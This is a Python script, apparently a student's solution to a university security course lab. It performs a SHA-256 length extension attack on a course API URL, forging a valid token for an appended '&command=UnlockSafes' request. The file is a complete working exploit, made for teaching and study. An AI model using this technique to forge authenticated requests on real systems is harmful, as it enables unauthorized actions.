#!/usr/bin/python3

# Run me like this:
# $ python3 len_ext_attack.py "https://project1.eecs388.org/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger

import sys
from urllib.parse import quote
from pysha256 import sha256, padding


class URL:
    def __init__(self, url: str):
        # prefix is the slice of the URL from "https://" to "token=", inclusive.
        self.prefix = url[:url.find('=') + 1]
        self.token = url[url.find('=') + 1:url.find('&')]
        # suffix starts at the first "command=" and goes to the end of the URL
        self.suffix = url[url.find('&') + 1:]

    def __str__(self) -> str:
        return f'{self.prefix}{self.token}&{self.suffix}'

    def __repr__(self) -> str:
        return f'{type(self).__name__}({str(self).__repr__()})'


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    url = URL(sys.argv[1])

    #
    # Modify the URL
    #
    
    #PADDING
    # m = (secret || valid commands)
    # length of secret = 8 bytes
    secretLength = 8
    #create padding
    addedPadding = padding(secretLength + len(url.suffix))
    #calculate padded message length
    padded_message_len = secretLength + len(url.suffix) + len(addedPadding)

    #CONTINUATION OF THE HASH
    # Initialize state of encryption using old token and the new padded message length as the count
    h1 = sha256(
        state=bytes.fromhex(url.token),
        count=padded_message_len
    )

    #continue hasing with malicious command (unlock safes)
    x = "&command=UnlockSafes".encode()
    h1.update(x)
    #new token for attack
    attackToken = h1.hexdigest()

    #PUTTING TOGETHER NEW URL
    #encoding padding to be compatiable for the url
    stringPadding = quote(addedPadding)
    #setting token as the new hashed token 
    url.token = attackToken
    #add padding and malicious command to suffix 
    url.suffix += stringPadding + "&command=UnlockSafes" 

    #url.prefix + attackToken + url.suffix + payload. The payload is padding and the new command. 
    print(url)


if __name__ == '__main__':
    main()
